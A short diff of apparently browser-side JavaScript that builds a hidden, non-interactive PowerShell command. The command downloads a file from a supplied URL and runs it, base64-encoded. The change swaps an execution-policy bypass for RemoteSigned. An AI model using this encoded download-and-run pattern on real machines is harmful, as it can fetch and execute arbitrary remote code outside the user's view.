@@ -106,7 +106,7 @@
       'try { $wc.DownloadFile(' + psq(url) + ', $target) } finally { if ($wc) { $wc.Dispose() } }',
       '& $target' + (argText ? ' ' + argText : '')
     ].join('; ');
-    return 'powershell -NoLogo -NoProfile -NonInteractive -OutputFormat Text -ExecutionPolicy Bypass -EncodedCommand ' + utf16leBase64(script);
+    return 'powershell -NoLogo -NoProfile -NonInteractive -OutputFormat Text -ExecutionPolicy RemoteSigned -EncodedCommand ' + utf16leBase64(script);
   }
   function E(doc, tag, css) { var n = doc.createElement(tag); if (css) n.style.cssText = css; return n; }
   function row(doc, gap) { return E(doc, 'div', 'display:flex;flex-wrap:wrap;align-items:center;gap:' + (gap || '4px') + ';'); }
